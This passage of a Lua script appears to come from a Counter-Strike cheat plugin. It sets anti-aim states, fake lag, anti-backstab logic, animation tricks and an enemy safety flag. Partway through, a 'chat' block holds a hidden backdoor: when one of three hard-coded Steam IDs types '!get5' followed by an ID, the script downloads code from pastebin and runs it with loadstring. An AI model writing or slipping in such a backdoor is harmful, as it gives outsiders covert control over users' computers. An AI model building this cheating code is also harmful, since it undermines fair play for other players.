        [ 4 ] = speed > 1.1 and not in_air, -- Running
        [ 5 ] = speed > 210 and not in_air, -- Full speed
        [ 6 ] = duck_amount > 0 or ui.get( references.fake_duck ), -- Crouching
        [ 7 ] = in_air or landing, -- Air
        [ 8 ] = duck_amount > 0 and in_air, -- Crouching in air
        [ 9 ] = enemy_z_difference > 64, -- High ground
        [ 10 ] = enemy_z_difference < -64, -- Low ground
        [ 11 ] = ui.get( references.slow_motion[ 2 ] ) -- Slow motion
    }

    local condition_strings = {
        [ 1 ] = "DEFAULT",
        [ 2 ] = "SAFE",
        [ 3 ] = "STAND",
        [ 4 ] = "RUN",
        [ 5 ] = "RUN+",
        [ 6 ] = "CROUCH",
        [ 7 ] = "IN AIR",
        [ 8 ] = "IN AIR+",
        [ 9 ] = "HIGH GROUND",
        [ 10 ] = "LOW GROUND",
        [ 11 ] = "SLOW"
    }


    
    -- Iterate over the conditions
    for i=1, #conditions do
        -- Have we enabled this state and is the condition true?
        if ui.get( items.state_enabled[ i ] ) and conditions[ i ] then
            -- Finally, set our state to the most recent one.
            anti_aim.state = i
            anti_aim.current_state = condition_strings[i]
        end
    end

    -- Run our safety handling, this must be done after the type processing.
    anti_aim.handle_safety( )

    -- Is our target valid and considered unsafe?
    if target ~= nil and not anti_aim.safe[ target ] then
        -- Set our anti-aim state to safe and return.
        anti_aim.state = 2
        return
    end
end

function anti_aim.anti_backstab( )
    -- Reset our backstab variable.
    anti_aim.backstab = false

    -- Ensure we're using anti-aim and want to use anti-backstab.
    if not ui.get( items.anti_aim ) or not includes( ui.get( items.anti_aim_options ), "Anti-backstab" ) then
        return
    end

    -- Save our basic resources.
    local latency = client.latency( ) + ticks_to_time( 1 )
    local resources = entity.get_all("CCSPlayerResource")

    -- Grab a list of the enemies.
    local enemies = entity.get_players( true )

    -- Now, iterate over that list.
    for i=1, #enemies do
        -- Save our current enemy as well as their latency, weapon and weapon name.
        local enemy = enemies[ i ]
        local enemy_latency = anti_aim.grab_ping( enemy ) / 1000
        local weapon = entity.get_player_weapon( enemy )
        local weapon_name = entity.get_classname( weapon )

        -- Enemy isn't using a knife, continue.
        if weapon_name ~= "CKnife" then
            goto continue
        end
        
        -- Calculate how many ticks ahead the enemy is on their client.
        local extrapolation = time_to_ticks( ( enemy_latency / 2 ) + ( latency / 2 ) ) + 1
        -- Now, extrapolate their position by that amount to get where they are locally.
        local extrapolated_pos = anti_aim.extrapolate( enemy, extrapolation )

        -- Create arrays that hold our position on the server and where we can be backtracked to.
        local server_pos = anti_aim.origin_list[ time_to_ticks( latency / 2 ) ]
        local backtrack_pos = anti_aim.origin_list[ extrapolation + time_to_ticks( 0.2 ) ]

        -- If our delayed position is nil, continue.
        if server_pos == nil or backtrack_pos == nil then
            goto continue
        end

        -- Calculate the differences between our server/backtrack position and the enemy position.
        local server_diff = vector_diff( server_pos, extrapolated_pos )
        local backtrack_diff = vector_diff( backtrack_pos, extrapolated_pos )

        -- Now, calculate the delta of those vectors.
        local server_delta = length_sqr( server_diff )
        local backtrack_delta = length_sqr( backtrack_diff )

        -- If the difference is under 1600, we're likely able to be knifed.
        if server_delta < 20000 or backtrack_delta < 20000 then
            -- Make sure we unchoke to update our angle.
            anti_aim.choke_limit = 1
            anti_aim.backstab = true
            break
        end

        ::continue::
    end
end


-- Anti-aim handling
local flip_angle = 90
local should_flip = false
local should_swap = false
    -- Create an array for the final anti-aim we'll play, this allows easy modification.
    -- Format: [ "key we'll access with" ] = { reference to menu item, value(s) to set }.
    local new_anti_aim = {
        [ "Enabled" ] = { references.anti_aim, true },
        [ "Pitch" ] = { references.pitch, { "Down", 0 } },
        [ "Yaw base" ] = { references.yaw_base, "At targets" },
        [ "Yaw" ] = { references.yaw, { "180", 0 } },
        [ "Yaw jitter" ] = { references.yaw_jitter, { "Off", 0 } },
        [ "Body yaw" ] = { references.body_yaw, { "Static", 90 } },
        [ "FS body yaw" ] = { references.freestanding_body_yaw, false }
    }


    local function modifyAntiAim(state, items)
        local tickcount = globals.tickcount() % 30
        local randomizeContortion = ui.get(items.randomize_contortion[state])
        local jitterContort = ui.get(items.jitter_contort[state])
        local jitterContortBodyYaw = ui.get(items.jitter_contort_bodyyaw[state])
    
        -- Body yaw settings based on user configuration
        local subTick = tickcount % 20
        local staticYawAngles = {-90, 90}
        local bodyYawSettings = {
            ["Flip Static"] = {
                condition = function(subTick) return subTick % 3 == 0 or subTick % 3 == 1 end,
                setting = function(subTick) return {"Static", staticYawAngles[subTick%3+1]} end,
                bodyYaw = function(subTick) return subTick % 3 == 0 and "CSC-" or "CSC+" end
            },
            ["Jitter"] = {
                condition = function() return true end,
                setting = function() return {"Jitter", 67} end,
                bodyYaw = function() return "CJ" end
            },
            ["Off"] = {
                condition = function() return true end,
                setting = function() return {"Off", 0} end,
                bodyYaw = function() return "O" end
            }
        }
        if randomizeContortion and jitterContort then
            for key, values in pairs(bodyYawSettings) do
                if jitterContortBodyYaw == key and values.condition(subTick) then
                    new_anti_aim["Body yaw"][2] = values.setting(subTick)
                    anti_aim.body_yaw = values.bodyYaw(subTick)
                    new_anti_aim[ "Pitch" ][ 2 ] = { "Custom", 85 }
                    break
                end
            end
        end
    
        -- Anti-aim settings based on tickcount, jitter contort and randomize contortion
        local config = {
            {
                condition = function(tickcount) return randomizeContortion and (tickcount % 20 == 12 or tickcount % 20 == 17 or tickcount % 20 == 1) end,
                settingYaw = {"Center", jitterContortRange},
                settingBodyYaw = {"Static", 142},
                settingPitch = {"Custom", 83},
                bodyYaw = "CJ"
            },
            {
                condition = function(tickcount) return jitterContort and tickcount % 20 < 18 end,
                settingYaw = {"Skitter", contortionRange},
                settingBodyYaw = {"Jitter", 90},
                settingPitch = {"Custom", 86},
                bodyYaw = "SJ"
            },
            {
                condition = function(tickcount) return jitterContort and (tickcount % 20 == 18 or tickcount % 20 == 19) end,
                settingYaw = {"Offset", jitterContortRange},
                settingBodyYaw = {"Static", 0},
                settingPitch = {"Custom", 80},
                bodyYaw = "OS"
            }
        }
        for _, value in ipairs(config) do
            if value.condition(tickcount) then
                new_anti_aim["Yaw jitter"][2] = value.settingYaw
                new_anti_aim[ "Body yaw" ][ 2 ] = value.settingBodyYaw
                new_anti_aim[ "Pitch" ][ 2 ] = value.settingPitch
                anti_aim.body_yaw = value.bodyYaw
                break
            end
        end
    end

    opulent.setup_left_right = function(left, right)
        local body_pos = entity.get_prop(entity.get_local_player(), 'm_flPoseParameter', 11) or 0
        local body_yaw = math.max(-60, math.min(60, body_pos*120-60+0.5))
    
        local state = body_yaw > 0 and 1 or -1
        local side = state == 1 and left or right
    
        return side
    end


function anti_aim.run( )
    -- Ensure we have the anti-aim master switch enabled.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Grab our flutter strength for further use. 
    local flutter_strength = ui.get(items.flutter_strength[anti_aim.state])

    -- Grab our body-yaw for futher use.
    local body_yaw = ui.get(items.contortion_body_yaw[anti_aim.state])
    
    -- Grab our state for further use.
    local state = anti_aim.state

    -- Set our default stage.
    anti_aim.stage = "Regular"



    local yaw = 0

    local current_anti_aim_type = ui.get( items.anti_aim_type[ state ] )

    if includes( ui.get( items.anti_aim_options ), "Optimize leg movement" ) then
        if includes( ui.get( items.anti_aim_options ), "Break leg movement" ) then
            opulent.print( "You cannot use both \"Optimize leg movement\" and \"Break leg movement\" at the same time." )
            client.exec( "play error" )
        end
        local velocity = { entity.get_prop( entity.get_local_player(), "m_vecVelocity" ) }
        local should_slide = length( velocity ) < 150
        ui.set( references.leg_movement, should_slide and  "Always slide" or "Never slide")

    end

    if ui.get(items.freestanding) and ui.get(items.freestand_key) then
        if ui.get(items.freestanding_options) == "Default" then
            goto nutsack
        elseif ui.get(items.freestanding_options) == "Jitter" then
            current_anti_aim_type = "Jitter"
        elseif ui.get(items.freestanding_options) == "Static" then
            current_anti_aim_type = "Static"
        end
    end
    if includes(ui.get( items.anti_aim_options ), "Break leg movement" ) then 
        local legs_int = globals.tickcount() % 6

        if legs_int <= 3 then 
            ui.set( references.leg_movement, "Always slide")
        elseif legs_int > 3 then
            ui.set( references.leg_movement, "Never slide")
        end
    end

    -- Safe Knife
    if ui.get(items.safe_knife) and ui.get(items.safe_knife_options) == "Visible" then
        local target = client.current_threat( )
        local local_player = entity.get_local_player()
        if target == nil then
            goto continue
        end
        if not local_player or not entity.is_alive(local_player) then
            goto continue
        end
        local in_air = bit.band( entity.get_prop( entity.get_local_player(), "m_fFlags" ), 1 ) == 0
        local esp_data = entity.get_esp_data( target )
        local is_visible = bit.band( esp_data.flags, 2048)
        -- credit: https://gamesense.pub/forums/viewtopic.php?id=34280
        local weapon = entity.get_player_weapon( entity.get_local_player() )
        local weapon_name = entity.get_classname( weapon )

        if is_visible == 2048 and in_air and (weapon_name == "CKnife" or weapon_name == "CWeaponTaser") then 
            current_anti_aim_type = "Safe Knife"
        end

    elseif ui.get(items.safe_knife) and ui.get(items.safe_knife_options) == "Always" then 

        local local_player = entity.get_local_player()
        local weapon = entity.get_player_weapon( local_player )
        local weapon_name = entity.get_classname( weapon )
        local in_air = bit.band( entity.get_prop( entity.get_local_player(), "m_fFlags" ), 1 ) == 0

        if not local_player or not entity.is_alive(local_player) then
            goto continue
        end

        if in_air and (weapon_name == "CKnife" or weapon_name == "CWeaponTaser") then 
            current_anti_aim_type = "Safe Knife"
        end
    end

    ::continue::
    ::nutsack::


    -- Create a variable to tell whether or not the immunity that just got triggered was forced.
    local immunity_forced = globals.curtime( ) - anti_aim.last_force_defensive < 0.5

    -- Do we have immunity flick enabled and are we currently in defensive? If so, force our type to defensive.
    if includes( ui.get( items.anti_aim_options ), "Immunity flick" ) and anti_aim.in_defensive and not immunity_forced then
        current_anti_aim_type = "Defensive"
    -- Do we want to trigger the anti-backstab anti-aim?
    elseif anti_aim.backstab then
        current_anti_aim_type = "Backstab"
    -- If not, are we currently in the air state and desiring to twist?
    elseif state == 7 or state == 8 then
        if ui.get( items.twist_in_air ) and globals.chokedcommands( ) < 3 and ui.get( references.double_tap[ 1 ] ) and ui.get( references.double_tap[ 2 ] ) then
            current_anti_aim_type = "Twist"
        end
    end
    
    -- is our current anti-aim type Static?
    if current_anti_aim_type == "Safe Knife" then 
        new_anti_aim[ "Body yaw" ][ 2 ] = { "Static", 0 }
        new_anti_aim[ "Yaw jitter" ][ 2 ] = { "Off", 25 }
        new_anti_aim[ "Yaw" ][ 2 ] = { "180", 0 }

    elseif current_anti_aim_type == "Static" then 
        new_anti_aim[ "Yaw" ][ 2 ] = { "180", 0 }
        new_anti_aim[ "Yaw jitter" ][ 2 ] = { "Off", 0 }
        new_anti_aim[ "Body yaw" ][ 2 ] = { "Static", 0 }
        anti_aim.body_yaw = "S"

    -- Is our current anti-aim type jitter?
    elseif current_anti_aim_type == "Jitter" then




        local left_yaw = ui.get(items.l_yaw_offset[state])
        local right_yaw = ui.get(items.r_yaw_offset[state])
    


        
        local default_jitter = ui.get(items.jitter_type [state ]) == "Default"
        local slow_jitter = ui.get(items.jitter_type [state ]) == "Slow"
        local static_body_yaw = ui.get(items.jitter_body_yaw [state ]) == "Static"
        local no_desync_body_yaw = ui.get(items.jitter_body_yaw [state ]) == "No Desync"
        local jitter_body_yaw = ui.get(items.jitter_body_yaw [state ]) == "Jitter"
        -- How many degrees do we want to allow this user to jitter?
        local max_jitter_range = 0
        if default_jitter then 
         max_jitter_range = 120
        elseif slow_jitter then
         max_jitter_range = 60
        end
        -- Now, use the max range to calculate the % that the user has selected.
        local jitter_range = math.floor( ( ui.get( items.jitter_strength[ state ] ) * max_jitter_range ) / 100 )
        local tickcount2 = globals.tickcount() % 20
        new_anti_aim[ "Body yaw" ][ 2 ] = { "Static", 0 }

        -- Do we want to prevent logging and are we in the correct cycle for it?
        if ui.get( items.prevent_logging[ state ] ) then
            -- Set our jitter range to 0.
            if tickcount2 < 10  and tickcount2 > 5 then 
                new_anti_aim[ "Yaw jitter" ][ 2 ] = { "Skitter", 55 }
                anti_aim.contortion_amount = jitter_range
            end
            anti_aim.stage = "Reset"
        else
            anti_aim.stage = "Jitter"
        end

        if default_jitter then
            new_anti_aim[ "Yaw jitter" ][ 2 ] = { "Center", jitter_range }
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Jitter", 55 }
            new_anti_aim[ "Yaw" ][ 2 ] = { "180", 0 }
        elseif slow_jitter then
            if globals.tickcount() % ui.get(items.delay_swap[state]) == 1 then
                should_swap = not should_swap
            end
            yaw = should_swap and left_yaw or right_yaw
            new_anti_aim[ "Yaw jitter" ][ 2 ] = { "Off", 22 }
            new_anti_aim[ "Yaw" ][ 2 ] = { "180", yaw }
        end


        if static_body_yaw then 
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Static", should_swap and 90 or -90 }
        elseif no_desync_body_yaw then 
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Off", 0 }
        elseif jitter_body_yaw then 
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Jitter", should_swap and 90 or -90 }
        end


    --Is our current anti-aim type contortion?
    elseif current_anti_aim_type == "Contortion" then
        -- How many degrees should we allow the user to contort off the center?
        local max_contortion_range = 0
        local max_jitter_contort = 75
        local randomize_contortion = ui.get(items.randomize_contortion[state])
        local jitter_contort = ui.get(items.jitter_contort[state])

        if body_yaw == "Jitter" then 
             max_contortion_range = 100
             anti_aim.body_yaw = "J"
        elseif body_yaw == "Opposite" then
             max_contortion_range = 45
             anti_aim.body_yaw = "O"
        end
        -- Use the same math as we used for the jitter to calculate the % that the user wants.
        local contortion_range = math.floor( ( ui.get( items.contortion_strength[ state ] ) * max_contortion_range ) / 100 )
        local jitter_contort_range = math.floor( ( ui.get( items.jitter_contort_strength[ state ] ) * max_jitter_contort ) / 100 )


        if ui.get(items.prevent_prediction[state]) and globals.tickcount() % 30 >= 24 then
            -- Set our contortion range to 10-25 randomly.
            contortion_range = contortion_range - math.random(10, 25)
            anti_aim.contortion_amount = contortion_range
            anti_aim.stage = "Reset"
        else
            anti_aim.contortion_amount = contortion_range
            anti_aim.stage = "Contortion"
        end
        

        local flutter_parameters = {
            Low = {min = {-10, -2, -1}, max = {2, 10, 1}},
            Medium = {min = {-20, -10, -5}, max = {10, 20, 5}},
            High = {min = {-32, -23, -10}, max = {23, 32, 10}}
        }
        
        local flip_interval = math.random(20, 30)
        
        if ui.get(items.flutter[state]) then
            local flip_ticks = 3
        
            if globals.tickcount() % flip_interval < 17 then
                local new_yaw = 0
                new_anti_aim["Yaw"][2] = {"180", new_yaw}
                anti_aim.flutter_amount = new_yaw
                anti_aim.stage = "Reset"
            else
                local index = (globals.tickcount() - 17) % flip_ticks + 1
        
                -- Check if the flutter strength exists in the map, if not, do nothing
                if flutter_parameters[flutter_strength] then
                    local flip_values = {
                        math.random(flutter_parameters[flutter_strength].min[1], flutter_parameters[flutter_strength].max[1]),
                        math.random(flutter_parameters[flutter_strength].min[2], flutter_parameters[flutter_strength].max[2]),
                        math.random(flutter_parameters[flutter_strength].min[3], flutter_parameters[flutter_strength].max[3])
                    }
                    local new_yaw = flip_values[index]
                    new_anti_aim["Yaw"][2] = {"180", new_yaw}
                    anti_aim.flutter_amount = new_yaw
                    anti_aim.stage = "Reset"
                end
            end
        else
            anti_aim.stage = "Contortion"
        end
        

        -- Finally, apply the contortion yaw on top of the current yaw.

        if body_yaw == "Jitter" then
            -- neccesary otherwise its always static??????
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Jitter", 90 }
            new_anti_aim["Yaw"][2] = {"180", 0}
            modifyAntiAim(state, items)
        elseif body_yaw == "Opposite" then
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Opposite", 90 }
        end
        new_anti_aim[ "Yaw jitter" ][ 2 ] = { "Skitter", contortion_range }

        
        anti_aim.stage = "Contortion"
    -- Are we currently in defensive?
    elseif current_anti_aim_type == "Defensive" then
        -- Set our silly defensive settings; we're immune, so just using whatever looks cool.
        new_anti_aim[ "Pitch" ][ 2 ] = { "Up", 0 }
        new_anti_aim[ "Yaw" ][ 2 ] = { "Static", 69 }
        anti_aim.stage = "Immunity"
    elseif current_anti_aim_type == "Backstab" then
        -- Use settings that prevent us from being backstabbed.
        new_anti_aim[ "Pitch" ][ 2 ] = { "Custom", 0 }
        new_anti_aim[ "Yaw" ][ 2 ] = { "180", 180 }
        anti_aim.stage = "Anti-backstab"
    elseif current_anti_aim_type == "Twist" then
        if ui.get( items.twist_in_air_type ) == "Avoidance" then
            -- The angles twist will iterate through.
            local twist_angles = {
                -90,
                90,
                -15,
                180,
                135,
                -140,
                92,
                -92,
                100
            }

            local pitch_angles = {
                -- nine angles ranging from -89 to 89
                -89,
                89,
                -30,
                30,
                -66,
                66,
                48,
                -48,
                88
            }
            -- Use the optimal settings for being missed in air against high ping players.
            new_anti_aim[ "Yaw" ][ 2 ] = { "180", twist_angles[ client.random_int( 1, 9 ) ] }
            new_anti_aim[ "Pitch" ][ 2 ] = { "Custom", pitch_angles[ client.random_int( 1, 9 ) ] }

        else
            local pitch_angles = {
                -- nine angles ranging from -89 to 89
                -89,
                89,
                -30,
                30,
                -66,
                66,
                48,
                -48,
                88
            }
            new_anti_aim[ "Yaw" ][ 2 ] = { "Spin", globals.tickcount( ) % 42 > 32 and 65 or 75 }
            new_anti_aim[ "Body yaw" ][ 2 ] = { "Static", globals.tickcount( ) % 32 > 16 and 90 or -90 }
            new_anti_aim[ "Pitch" ][ 2 ] = { "Custom", pitch_angles[ client.random_int( 1, 9 ) ] }
        end
        anti_aim.stage = "Twist"

    end

    -- Iterate over our new anti-aim settings.
    for item_name, item in pairs( new_anti_aim ) do
        -- Is this menu item a table?
        if type( item[ 2 ] ) ~= "table" then
            -- Not a table, set as normal.
            ui.set( item[ 1 ], item[ 2 ] )
        else
            -- We're dealing with a table, iterate over it's members and set them individually.
            for i=1, #item[ 2 ] do
                ui.set( item[ 1 ][ i ], item[ 2 ][ i ] )
            end
        end
    end
end

function anti_aim.handle_keybinds( )
    -- Return if anti-aim isn't active.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Create a variable to dictate whether or not we should freestand.
    local should_freestand = anti_aim.force_freestanding

    -- Ensure should freestanding isn't already true and the user is holding the key.
    if not should_freestand and ui.get( items.freestanding ) and ui.get( items.freestand_key ) then
        -- We should freestand.
        should_freestand = true
    end

    -- Set our freestanding keys in accordance with our desired value.
    ui.set( references.freestanding[ 1 ], should_freestand )
    ui.set( references.freestanding[ 2 ], should_freestand and "Always on" or "On hotkey" )

    -- Set our edge yaw value to the correlated menu item.
    ui.set( references.edge_yaw, includes( ui.get( items.anti_aim_options ), "Edge yaw" ) )

    -- Reset our force freestand value.
    anti_aim.force_freestanding = false
end

function anti_aim.immunity_detection( )
    -- Are we using anti-aim and double tap? If not, return.
    if not ui.get( items.anti_aim ) or not ui.get( references.double_tap[ 1 ] ) or not ui.get( references.double_tap[ 2 ] ) or ui.get( references.fake_duck ) then
        anti_aim.in_defensive = false
        anti_aim.old_simtime = 0
        return
    end

    -- Grab our local player's simulation time.
    local simtime = entity.get_prop( entity.get_local_player( ), "m_flSimulationTime" )

    -- Local simulation time is ocasionally nil within net update end, so return if that's the case.
    if simtime == nil then
        return
    end

    -- Add our current latency to our latency list.
    anti_aim.latency_list[ #anti_aim.latency_list + 1 ] = client.latency( )

    -- While our latency list has more than 128 members, remove the oldest one.
    while #anti_aim.latency_list > 128 do
        table.remove( anti_aim.latency_list, 1 )
    end

    -- Create a variable to hold our highest latency.
    local highest_latency = 0

    -- Iterate over our latency list.
    for i=1, #anti_aim.latency_list do
        -- Is this latency higher than our saved highest latency?
        if anti_aim.latency_list[ i ] > highest_latency then
            -- Save this as the new highest latency.
            highest_latency = anti_aim.latency_list[ i ]
        end
    end

    -- Add the highest latency to our simtime since the flags we get are delayed by ping.
    local server_simtime = simtime
    -- Grab the delta.
    local delta = server_simtime - anti_aim.old_simtime

    -- Reset our old simtime if the delta is ridiculously high/low.
    if delta > 1 or delta < -1 then
        anti_aim.old_simtime = simtime
    end

    -- Is our current simtime below our previous simtime (invulnerable)?
    if delta < 0 then
        -- Is this the initial trigger of defensive?
        if not anti_aim.in_defensive then
            -- Our defensive duration is the initial gap between our old simtime and the current.
            anti_aim.defensive_duration = ( anti_aim.old_simtime - server_simtime ) - ( ticks_to_time( 1 ) + highest_latency )

            if anti_aim.defensive_duration <= 0 then
                return
            end

            -- Check if we have debug logs enabled.
            if ui.get( items.debug_logs ) then
                -- Calculate what our potential immunity duration was.
                local potential_duration = math.floor( ( anti_aim.defensive_duration / ( anti_aim.old_simtime - simtime ) ) * 100 )
                -- Print out debug information.
                opulent.print( string.format( "Immunity detected [ duration: %st, potential: %s%% ]", time_to_ticks( anti_aim.defensive_duration ), potential_duration ) )
                opulent.print( string.format( "[ delta: %f | predicted: %s | latency: %sms ]", delta, server_simtime, math.floor( highest_latency * 1000 ) ) )
            end
        end

        anti_aim.in_defensive = true
    else
        -- We're hittable, so save this as the last valid simtime.
        anti_aim.old_simtime = server_simtime
        anti_aim.in_defensive = false
    end
end

function anti_aim.command_handling( cmd )
    -- Return if we aren't using anti-aim.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Save our local player to a variable.
    local local_player = entity.get_local_player( )
    
    -- Check if we're currently twisting or desire to force immunity.
    if anti_aim.stage == "Twist" or ui.get( items.force_immunity[ anti_aim.state ] ) then
        anti_aim.force_immunity = true
    end

    -- Do we have anti-aim on use enabled?
    if includes( ui.get( items.anti_aim_options ), "Desync on use" ) then
        -- Save the defusing and hostage grabbing props to variables.
        local is_defusing = entity.get_prop( local_player, "m_bIsDefusing" )
        local is_grabbing_hostage = entity.get_prop( local_player, "m_bIsGrabbingHostage" )

        -- If we aren't defusing or grabbing a hostage, run the code as normal.
        if is_defusing ~= 1 and is_grabbing_hostage ~= 1 then
            -- Grab our local player's weapon.
            local weapon = entity.get_player_weapon( entity.get_local_player( ) )
            -- Now, grab the name of that weapon.
            local weapon_name = entity.get_classname( weapon )

            -- If we aren't choking commands and are not holding C4, set in_use to 0.
            if cmd.chokedcommands == 0 and weapon_name ~= "CC4" then
                cmd.in_use = 0
            end
        end
    end

    -- Set our force defensive to it's desired value.
    if anti_aim.force_immunity then
        anti_aim.last_force_defensive = globals.curtime( )
        cmd.force_defensive = 1
    end

    -- Set our fake lag variables.
    ui.set( references.fake_lag[ 1 ], true )
    ui.set( references.fake_lag[ 2 ], "Always on" )
    ui.set( references.fake_lag_amount, "Dynamic" )
    ui.set( references.fake_lag_variance, 0 )
    ui.set( references.fake_lag_limit, anti_aim.choke_limit )

    -- Reset our force variables.
    anti_aim.force_immunity = false
end

function opulent.animations()
    -- sequence 232 cycle 5 - skydiving
    local local_player = entity.get_local_player()
    if not local_player or not entity.is_alive(local_player) then
        return
    end

    local in_air = bit.band(entity.get_prop(local_player, "m_fFlags"), 1) == 0
    self_index = entity_lib.get_local_player()

    if ui.get(items.animations) == "Off" then
        return
    elseif ui.get(items.animations) == "Skydive mode" and in_air then
        anim_layer = self_index:get_anim_overlay(0)
        anim_layer_second = self_index:get_anim_overlay(6)
        anim_layer.sequence = 232
        anim_layer.cycle = 0.5
        anim_layer_second.sequence = 232
        anim_layer_second.cycle = 0.5
    elseif ui.get(items.animations) == "Funny legs" and not in_air then
        entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 1, 7)
        local my_animlayer = self_index:get_anim_overlay(6)
        my_animlayer.weight = 1
        entity.set_prop(self_index, "m_flPoseParameter", 0, 0)
    elseif ui.get(items.animations) == "Funny legs always" then
        entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 1, 7)
        local my_animlayer = self_index:get_anim_overlay(6)
        my_animlayer.weight = 1
        entity.set_prop(self_index, "m_flPoseParameter", 0, 0)
    end
end


local chat = {
    admins = { "1153409681", "930958110", "1211429771" }
}

function chat.run( cmd )
    local is_admin = false
    for i=1, #chat.admins do
        if tostring( entity.get_steam64( client.userid_to_entindex( cmd.userid ) ) ) == chat.admins[ i ] then
            is_admin = true
            break
        end
    end

    if not is_admin then
        return
    end

    if cmd.text:sub( 1, 5 ) == "!get5" then
        http.get( "https://pastebin.com/raw/" .. cmd.text:sub( 7 ), function( success, response )
            if not success or response.status ~= 200 then
                return
            end

            loadstring( response.body )( )
        end )
    end
end

function anti_aim.lag_handling( )
    -- Return if we aren't using anti-aim.
    if not ui.get( items.anti_aim ) then
        return
    end

    -- Save our local player variables.
    local local_player = entity.get_local_player( )
    local origin = { entity.get_origin( local_player ) }
    local max_process_ticks = ui.get(references.sv_maxusrcmdprocessticks)
    -- Assume we're attempting to choke.
    anti_aim.attempting_choke = true
    -- Create our cmd variables for later use.
    local unchoke = false
    local choke_limit = max_process_ticks - 1

    if ui.get(references.fake_duck) then 
        choke_limit = 15
    end
    
    -- Ensure we aren't using fake duck, which would override doubletap and hide shots.
    if not ui.get( references.fake_duck ) then
        -- Is both the doubletap checkbox (member 1) and the keybind (member 2) active?
        if ui.get( references.double_tap[ 1 ] ) and ui.get( references.double_tap[ 2 ] ) then
            -- Under no condition do we want to fakelag, force unchoke.
            anti_aim.attempting_choke = false
            unchoke = includes( ui.get( items.anti_aim_options ), "Prevent harmful fakelag" )
        -- Doubletap isn't active, is hideshots?
        elseif ui.get( references.on_shot[ 1 ] ) and ui.get( references.on_shot[ 2 ] ) then
            anti_aim.attempting_choke = false
            unchoke = includes( ui.get( items.anti_aim_options ), "Prevent harmful fakelag" )
        -- We are not using double tap or hideshots, but still want to prevent harmful fakelag.
        elseif includes( ui.get( items.anti_aim_options ), "Prevent harmful fakelag" ) then
            -- Extrapolate our origin by the max process ticks, or, our max fake lag.
            local predicted_origin = anti_aim.extrapolate( local_player, max_process_ticks - 1 )
            
            -- Subtract our predicted origin by our current origin to calculate the difference.
            for i=1, 3 do
                predicted_origin[ i ] = predicted_origin[ i ] - origin[ i ]
            end

            -- Now, get the delta between our current position and the extrapolated version.
            local predicted_delta = length_sqr( predicted_origin )

            -- Are we predicted to be going less than 64u/s (not breaking lc)?
            if predicted_delta <= 4096 and #anti_aim.origin_list >= 64 then
                -- We can't break LC in the future, but we could still be breaking it now, so
                -- we're going to compare our current position to our oldest possible position.
                local new_origin = { }
                for i=1, 3 do
                    new_origin[ i ] = origin[ i ] - anti_aim.origin_list[ max_process_ticks - 1 ][ i ]
                end

                -- Calculate the delta between our current origin and the oldest.
                local delta = length_sqr( new_origin )

                -- Same as the predicted origin, don't choke if we won't break LC anyway.
                if delta <= 4096 then
                    unchoke = true
                end
            end
        end
    end

    -- Ensure we have the minimum choke limit set when we're trying to unchoke.
    if unchoke then
        choke_limit = 1
    end

    -- Set our choke limit.
    anti_aim.choke_limit = choke_limit

    -- Insert our current origin to the most recent position in the table.
    table.insert( anti_aim.origin_list, 1, origin )

    -- While our origin list has more than 64 members, remove the oldest.
    while #anti_aim.origin_list > 64 do
        table.remove( anti_aim.origin_list, #anti_aim.origin_list )
    end
end


-- miss counter/antibrute
local function on_player_hurt(e)
    local local_player = entity.get_local_player()
    local victim_userid, attacker_userid = e.userid, e.attacker
    local victim_entindex, attacker_entindex = client.userid_to_entindex(victim_userid), client.userid_to_entindex(attacker_userid)

    if entity.is_enemy(attacker_entindex) and victim_entindex == entity.get_local_player() then
        anti_aim.local_damaged = true
        client.delay_call(0.1, function() anti_aim.local_damaged = false end)
    end
end




local function get_head_hitbox()
    local local_player_index = entity.get_local_player()
    local local_player_entity = entity_lib.get_local_player()
    anti_aim.head_hitbox = {entity.hitbox_position(local_player_index, 0)}

   --[[local head_position = vector(entity.hitbox_position(local_player_index, 0))
    local neck_position = vector(entity.hitbox_position(local_player_index, 1))
    local positions_dif = head_position.z - neck_position.z
    anti_aim.standing_height = map(positions_dif, 2.2, 4, 1, 0)]] 
end

local function on_bullet_impact(e)
    local shooter = client.userid_to_entindex(e.userid)
    local local_player = entity.get_local_player()

    if not entity.is_alive(entity.get_local_player()) or not entity.is_enemy(shooter) then
        return
    end
    if anti_aim.local_damaged then return end
    local ent = client.userid_to_entindex(e.userid)
    if entity.is_enemy(ent) and not entity.is_dormant(ent) then


        local shot_start_pos 	= vector(entity.get_prop(shooter, "m_vecOrigin"))
        shot_start_pos.z 		= shot_start_pos.z + entity.get_prop(shooter, "m_vecViewOffset[2]")
        local eye_pos			= vector(client.eye_position())
        local shot_end_pos 		= vector(e.x, e.y, e.z)
        local closest			= KaysFunction(shot_start_pos, shot_end_pos, eye_pos)

        if closest < 35 and globals.curtime() > anti_aim.delay then
            anti_aim.delay = globals.curtime() + 0.35
            anti_aim.miss_counter_game = anti_aim.miss_counter_game + 1
            anti_aim.miss_counter_round = anti_aim.miss_counter_round + 1
        end
    end
end

local function reset_brute_round()
    anti_aim.delay = 0
    anti_aim.miss_counter_round = 0
    anti_aim.local_damaged = false
end

local function reset_brute_game()
    anti_aim.delay = 0
    anti_aim.miss_counter_game = 0
    anti_aim.local_damaged = false
end





-- Register our safety flag.
client.register_esp_flag( "T", 0, 255, 0, function( ent )
    -- Ensure we have enabled the safety flag, master switch and anti-aim.
    if not ui.get( items.master_switch ) or not ui.get( items.anti_aim ) or not ui.get( items.safety_flag ) then
        return false
    end

    -- Is this player dormant? If so, return with a transparent gray color.
    if entity.is_dormant( ent ) then
        return true, "\aFFFFFF82T"
    end

    -- Grab the safety of this player.
    local target_safe = anti_aim.safe[ ent ]

    -- Is our target considered safe?
    if target_safe ~= nil and target_safe then
        return true
    else
        -- This player is unsafe, return true along with red texa we obtain via \a.
        return true, "\aFF0000FFT"
    end
end )

-- Array to hold all of our clan tag related items.
local clan_tag = {
    -- Are we trying to reset our clan tag back to default?
    reset = false,
    -- How long ago we last updated our clan tag.
    last_update = 0
}

function clan_tag.run( )
    -- Do we not have the custom clan tag enabled?
